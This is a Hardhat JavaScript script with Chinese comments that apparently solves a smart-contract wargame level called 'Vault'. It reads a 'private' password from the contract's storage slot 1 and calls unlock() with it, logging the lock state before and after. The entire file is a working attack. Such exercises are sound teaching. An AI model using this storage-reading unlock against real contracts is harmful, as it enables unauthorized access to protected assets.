const { ethers } = require("hardhat");

async function VaultScript(){
    // Vault合约地址
    const VaultAddress = "0xcD6906B2ea3fF967DE65A334607102509575Bc60";
    const vault = await ethers.getContractAt("Vault", VaultAddress);

    console.log("攻击前 locked = ",await vault.locked())

    // 通过存储槽获取状态变量值
    const passeord = await ethers.provider.getStorage(VaultAddress, 1);

    // 执行攻击
    const tx = await vault.unlock(passeord);
    await tx.wait();

    console.log("攻击后 locked = ",await vault.locked())
}

VaultScript().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});